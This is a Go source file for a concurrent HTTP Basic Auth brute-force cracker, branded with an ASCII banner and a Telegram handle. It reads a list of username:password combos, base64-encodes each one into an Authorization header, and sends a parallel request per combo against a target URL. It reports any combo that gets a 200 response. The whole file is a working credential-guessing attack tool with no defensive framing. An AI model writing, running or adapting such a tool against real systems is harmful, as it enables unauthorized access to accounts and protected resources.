package main

import (
	b64 "encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
)

var wg sync.WaitGroup

func main() {
	//Params
	url := flag.String("url", "", "url to attack")
	passListPath := flag.String("plist", "passlist.txt", "path to auth combo file")
	//debug := flag.Int("debug", -1, "log all status codes")
	//degug := true
	timeout := flag.Int("timeout", 10, "set http request timeout in seconds.")

	flag.Parse()

	banner()

	//Checking requirement url.
	if *url == "" {
		fmt.Println("")
		color.Red("*Please define a url to start")
		os.Exit(1)
	}

	//Checking requirement pass comobo list. Reading passlist.
	passlistRaw, err := ioutil.ReadFile(*passListPath)
	if err != nil {
		panic(err)
	}

	passList := strings.Split(string(passlistRaw), "\n")
	//fmt.Println(passList)
	start := time.Now()
	crack(*url, passList, *timeout)
	fmt.Printf("\nfinished cheking %d combos in %v\n", len(passList), time.Since(start))

}

func crack(url string, passList []string, timeout int) {
	//banner()
	fmt.Println("\n[" + url + "] checking url for authentication...")
	if !check(url) {
		log.Fatal("No basic authentication response received. please recheck the url.")
	}
	fmt.Printf("["+url+"] cracking with %d authentication combos...", len(passList))
	fmt.Println("")
	for _, rawAuthCombo := range passList {
		wg.Add(1)
		go func(rawAuthCombo string) {
			c := &http.Client{
				Timeout: time.Second * time.Duration(timeout),
			}

			// Base64 encoded combo
			b64auth := b64.StdEncoding.EncodeToString([]byte(strings.TrimSpace(rawAuthCombo)))
			req, _ := http.NewRequest("GET", url, nil)
			basicAuthStr := "Basic " + b64auth

			req.Header.Add("authorization", basicAuthStr)
			res, err := c.Do(req)

			if err == nil {
				defer res.Body.Close()
				if res.StatusCode != 401 {
					if res.StatusCode > 500 {
						color.Red("Stopping the attack. server is stressing. " + strconv.Itoa(res.StatusCode))
						os.Exit(1)
					}

					if res.StatusCode == 200 {
						color.Green("[" + url + "] => matched " + strings.TrimSpace(rawAuthCombo) + " [" + strconv.Itoa(res.StatusCode) + "]")
					} else {
						if false {
							fmt.Println("[" + url + "] => " + strings.TrimSpace(rawAuthCombo) + " [" + strconv.Itoa(res.StatusCode) + "]")
						}

					}

				}
			}
			wg.Done()
		}(rawAuthCombo)

	}

	wg.Wait()

}

func banner() {
	bannerArt := `
	██████╗██████╗ ██╗  ██╗ ██████╗  ██╗
	██╔════╝██╔══██╗██║  ██║██╔═████╗███║
	██║     ██████╔╝███████║██║██╔██║╚██║
	██║     ██╔══██╗╚════██║████╔╝██║ ██║
	╚██████╗██║  ██║     ██║╚██████╔╝ ██║ HTTP Basic Auth cracker,
	 ╚═════╝╚═╝  ╚═╝     ╚═╝ ╚═════╝  ╚═╝ Telegram: @allfatherx`

	color.Blue(bannerArt)
	color.Yellow("Please use -help to view command list")
}

func check(url string) bool {
	c := &http.Client{
		Timeout: time.Second * 10,
	}
	res, err := c.Get(url)

	if err == nil {
		if res.StatusCode == 401 {
			return true
		}
		defer res.Body.Close()
	}
	return false
}
